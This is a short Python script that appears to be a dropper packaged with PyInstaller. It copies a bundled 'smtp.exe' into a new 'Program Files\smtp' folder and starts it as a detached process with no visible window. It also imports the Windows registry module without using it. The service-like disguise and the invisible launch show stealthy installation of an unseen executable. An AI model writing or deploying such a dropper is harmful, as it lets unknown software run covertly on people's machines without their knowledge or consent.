import os
import subprocess
import shutil
import pathlib
import time
import winreg
import sys

base = pathlib.Path(getattr(sys, '_MEIPASS', pathlib.Path(__file__).parent))

path = os.path.join(os.path.splitdrive(os.getcwd())[0], "\Program Files", "smtp")
executable_path = os.path.join(path, "smtp.exe")

try:
    os.mkdir(path)
except FileExistsError:
    pass

shutil.copy2(base / "smtp.exe", executable_path)

subprocess.Popen([executable_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)